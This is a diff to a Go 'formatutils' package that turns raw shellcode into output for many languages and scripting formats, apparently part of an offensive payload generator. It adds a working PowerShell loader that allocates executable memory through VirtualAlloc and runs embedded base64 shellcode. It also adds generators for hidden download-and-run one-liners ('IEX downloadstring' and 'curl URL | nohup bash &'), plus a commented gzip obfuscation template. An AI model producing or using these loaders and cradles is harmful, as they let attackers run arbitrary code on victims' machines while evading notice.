@@ -1,6 +1,7 @@
 package formatutils
 
 import (
+	"encoding/base64"
 	"fmt"
 	"strings"
 )
@@ -11,70 +12,122 @@ type FormatResult struct {
 }
 
 type FormatInfo struct {
-	Extension string
-	Desc      string
-	Converter func([]byte) []byte
+	Extension     string
+	Desc          string
+	Converter     func([]byte) []byte
+	SupportRemote bool
+	Usage         func(string) string
 }
 
 type Formatter struct {
-	supportedFormats map[string]FormatInfo
+	SupportedFormats map[string]FormatInfo
 }
 
 // NewFormatter creates a new formatter with all supported formats
 func NewFormatter() *Formatter {
+
 	formatter := &Formatter{
-		supportedFormats: make(map[string]FormatInfo),
+		SupportedFormats: make(map[string]FormatInfo),
 	}
 
+	formatter.register("executable", FormatInfo{
+		Extension: ".exe", Desc: "executable format", Converter: func(data []byte) []byte { return data },
+	})
+
 	// Register all supported formats with descriptions
-	formatter.register("raw", FormatInfo{".bin", "raw binary format", func(data []byte) []byte { return data }})
-	//formatter.register("bin", FormatInfo{".bin", "binary format", func(data []byte) []byte { return data }})
-	//formatter.register("binary", FormatInfo{".bin", "binary format", func(data []byte) []byte { return data }})
-	//formatter.register("native", FormatInfo{".exe", "native executable format", func(data []byte) []byte { return data }})
-	//formatter.register("exe", FormatInfo{".exe", "Windows executable format", func(data []byte) []byte { return data }})
-	//formatter.register("elf", FormatInfo{".elf", "Linux ELF executable format", func(data []byte) []byte { return data }})
+	formatter.register("raw", FormatInfo{
+		Extension: ".bin", Desc: "raw binary format", Converter: func(data []byte) []byte { return data },
+	})
 
-	formatter.register("c", FormatInfo{".c", "C language format", toC})
-	formatter.register("csharp", FormatInfo{".cs", "C# language format", toCSharp})
-	formatter.register("java", FormatInfo{".java", "Java language format", toJava})
-	//formatter.register("go", FormatInfo{".go", "Go language format", toGo})
-	formatter.register("golang", FormatInfo{".go", "Go language format", toGo})
+	formatter.register("c", FormatInfo{
+		Extension: ".c", Desc: "C language format", Converter: toC,
+	})
+	formatter.register("csharp", FormatInfo{
+		Extension: ".cs", Desc: "C# language format", Converter: toCSharp,
+	})
+	formatter.register("java", FormatInfo{
+		Extension: ".java", Desc: "Java language format", Converter: toJava,
+	})
 
-	formatter.register("python", FormatInfo{".py", "Python language format", toPython})
-	//formatter.register("py", FormatInfo{".py", "Python language format", toPython})
-	formatter.register("perl", FormatInfo{".pl", "Perl language format", toPerl})
-	//formatter.register("pl", FormatInfo{".pl", "Perl language format", toPerl})
-	formatter.register("ruby", FormatInfo{".rb", "Ruby language format", toRuby})
-	//formatter.register("rb", FormatInfo{".rb", "Ruby language format", toRuby})
+	formatter.register("golang", FormatInfo{
+		Extension: ".go", Desc: "Go language format", Converter: toGo,
+	})
 
-	formatter.register("bash", FormatInfo{".sh", "Bash script format", toBash})
-	//formatter.register("sh", FormatInfo{".sh", "shell script format", toBash})
-	formatter.register("powershell", FormatInfo{".ps1", "PowerShell script format", toPowerShell})
-	//formatter.register("ps1", FormatInfo{".ps1", "PowerShell script format", toPowerShell})
+	formatter.register("python", FormatInfo{
+		Extension: ".py", Desc: "Python language format", Converter: toPython,
+	})
 
-	formatter.register("hex", FormatInfo{".txt", "hexadecimal format", toHex})
-	formatter.register("num", FormatInfo{".txt", "numeric format", toNum})
-	//formatter.register("dw", FormatInfo{".txt", "dword format", toDword})
-	formatter.register("dword", FormatInfo{".txt", "dword format", toDword})
+	formatter.register("perl", FormatInfo{
+		Extension: ".pl", Desc: "Perl language format", Converter: toPerl,
+	})
 
-	formatter.register("js_be", FormatInfo{".js", "JavaScript big-endian format", func(data []byte) []byte { return toJavaScript(data, true) }})
-	formatter.register("js_le", FormatInfo{".js", "JavaScript little-endian format", func(data []byte) []byte { return toJavaScript(data, false) }})
+	formatter.register("ruby", FormatInfo{
+		Extension: ".rb", Desc: "Ruby language format", Converter: toRuby,
+	})
 
-	formatter.register("vbscript", FormatInfo{".vbs", "VBScript format", toVBScript})
-	formatter.register("vbapplication", FormatInfo{".vba", "VBA application format", toVBApplication})
+	formatter.register("bash", FormatInfo{
+		Extension: ".sh", Desc: "Bash script format", Converter: toBash,
+	})
+
+	formatter.register("powershell", FormatInfo{
+		Extension: ".ps1", Desc: "PowerShell script format", Converter: toPowerShell,
+	})
+
+	formatter.register("hex-oneline", FormatInfo{
+		Extension: ".hex", Desc: "hexadecimal format", Converter: toHexOneLine,
+	})
+	formatter.register("hex-multiline", FormatInfo{
+		Extension: ".hex", Desc: "hexadecimal format", Converter: toHexMultiLine,
+	})
+
+	formatter.register("num", FormatInfo{
+		Extension: ".txt", Desc: "numeric format", Converter: toNum,
+	})
+
+	formatter.register("dword", FormatInfo{
+		Extension: ".txt", Desc: "dword format", Converter: toDword,
+	})
+
+	formatter.register("js_be", FormatInfo{
+		Extension: ".js", Desc: "JavaScript big-endian format", Converter: func(data []byte) []byte { return toJavaScript(data, true) },
+	})
+	formatter.register("js_le", FormatInfo{
+		Extension: ".js", Desc: "JavaScript little-endian format", Converter: func(data []byte) []byte { return toJavaScript(data, false) },
+	})
+
+	formatter.register("vbscript", FormatInfo{
+		Extension: ".vbs", Desc: "VBScript format", Converter: toVBScript,
+	})
+	formatter.register("vbapplication", FormatInfo{
+		Extension: ".vba", Desc: "VBA application format", Converter: toVBApplication,
+	})
+
+	formatter.register("powershell-remote", FormatInfo{
+		Extension: ".ps1", Desc: "Execute ShellCode By PowerShell",
+		Converter:     toPowershellRemote,
+		SupportRemote: true,
+		Usage:         PowershellRemoteUsage,
+	})
+
+	formatter.register("curl-remote", FormatInfo{
+		Extension: ".bash", Desc: "Execute ELF by curl",
+		Converter:     toPowershellRemote,
+		SupportRemote: true,
+		Usage:         CurlRemoteUsage,
+	})
 
 	return formatter
 }
 
 // register adds a format to the supported formats map
 func (f *Formatter) register(name string, info FormatInfo) {
-	f.supportedFormats[strings.ToLower(name)] = info
+	f.SupportedFormats[strings.ToLower(name)] = info
 }
 
 // GetSupportedFormats returns a list of all supported format names
 func (f *Formatter) GetSupportedFormats() []string {
-	formats := make([]string, 0, len(f.supportedFormats))
-	for format := range f.supportedFormats {
+	formats := make([]string, 0, len(f.SupportedFormats))
+	for format := range f.SupportedFormats {
 		formats = append(formats, format)
 	}
 	return formats
@@ -82,13 +135,13 @@ func (f *Formatter) GetSupportedFormats() []string {
 
 // IsSupported checks if a format is supported
 func (f *Formatter) IsSupported(format string) bool {
-	_, exists := f.supportedFormats[strings.ToLower(format)]
+	_, exists := f.SupportedFormats[strings.ToLower(format)]
 	return exists
 }
 
 // GetFormatDescription returns the description for a specific format
 func (f *Formatter) GetFormatDescription(format string) string {
-	if info, exists := f.supportedFormats[strings.ToLower(format)]; exists {
+	if info, exists := f.SupportedFormats[strings.ToLower(format)]; exists {
 		return info.Desc
 	}
 	return format + " format"
@@ -97,15 +150,32 @@ func (f *Formatter) GetFormatDescription(format string) string {
 // GetFormatsWithDescriptions returns a map of format names to descriptions
 func (f *Formatter) GetFormatsWithDescriptions() map[string]string {
 	result := make(map[string]string)
-	for format, info := range f.supportedFormats {
+	for format, info := range f.SupportedFormats {
 		result[format] = info.Desc
 	}
 	return result
 }
 
+func (f *Formatter) GetFormatsSupportRemote() map[string]string {
+	result := make(map[string]string)
+	for format, info := range f.SupportedFormats {
+		if info.SupportRemote {
+			result[format] = info.Desc
+		}
+	}
+	return result
+}
+
+func (f *Formatter) IsSupportedRemote(format string) bool {
+	if info, exists := f.SupportedFormats[strings.ToLower(format)]; exists {
+		return info.SupportRemote
+	}
+	return false
+}
+
 // GetFormatExtension returns the file extension for a specific format
 func (f *Formatter) GetFormatExtension(format string) string {
-	if info, exists := f.supportedFormats[strings.ToLower(format)]; exists {
+	if info, exists := f.SupportedFormats[strings.ToLower(format)]; exists {
 		return info.Extension
 	}
 	return ".txt"
@@ -117,7 +187,7 @@ func (f *Formatter) Convert(data []byte, format string) (*FormatResult, error) {
 		return nil, fmt.Errorf("empty data")
 	}
 
-	formatInfo, exists := f.supportedFormats[strings.ToLower(format)]
+	formatInfo, exists := f.SupportedFormats[strings.ToLower(format)]
 	if !exists {
 		return nil, fmt.Errorf("unsupported format: %s", format)
 	}
@@ -277,7 +347,15 @@ func toPowerShell(data []byte) []byte {
 	return []byte(result.String())
 }
 
-func toHex(data []byte) []byte {
+func toHexOneLine(data []byte) []byte {
+	var result strings.Builder
+	for _, b := range data {
+		result.WriteString(fmt.Sprintf("%02x", b))
+	}
+	return []byte(result.String())
+}
+
+func toHexMultiLine(data []byte) []byte {
 	var result strings.Builder
 	for i, b := range data {
 		if i > 0 && i%16 == 0 {
@@ -379,4 +457,56 @@ func toVBApplication(data []byte) []byte {
 	}
 	result.WriteString(")\r\n")
 	return []byte(result.String())
+}
+
+func toPowershellRemote(data []byte) []byte {
+	base64Shellcode := base64.StdEncoding.EncodeToString(data)
+	ps_x64_template_0 := `Set-StrictMode -Version 2
+
+function func_get_proc_address {
+	Param ($var_module, $var_procedure)		
+	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+	$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
+	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
+}
+
+function func_get_delegate_type {
+	Param (
+		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
+		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
+	)
+
+	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
+	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')
+
+	return $var_type_builder.CreateType()
+}
+
+If ([IntPtr]::size -eq 8) {
+	[Byte[]]$var_code = [System.Convert]::FromBase64String('%s')
+
+	$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
+	$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
+	[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)
+
+	$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
+	$var_runme.Invoke([IntPtr]::Zero)
+}
+`
+	ps_x64_data_0 := fmt.Sprintf(ps_x64_template_0, base64Shellcode)
+	//ps_x64_template_1 := `$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%s"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();`
+	//ps_x64_template_0_base64 := base64.StdEncoding.EncodeToString([]byte(ps_x64_data_0))
+	//ps_x64_data_1 := fmt.Sprintf(ps_x64_template_1, ps_x64_template_0_base64)
+	return []byte(ps_x64_data_0)
+}
+
+func PowershellRemoteUsage(powershellURL string) string {
+	template := `powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('%s'))"`
+	return fmt.Sprintf(template, powershellURL)
+}
+
+func CurlRemoteUsage(url string) string {
+	template := `curl %s | nohup bash &`
+	return fmt.Sprintf(template, url)
 }
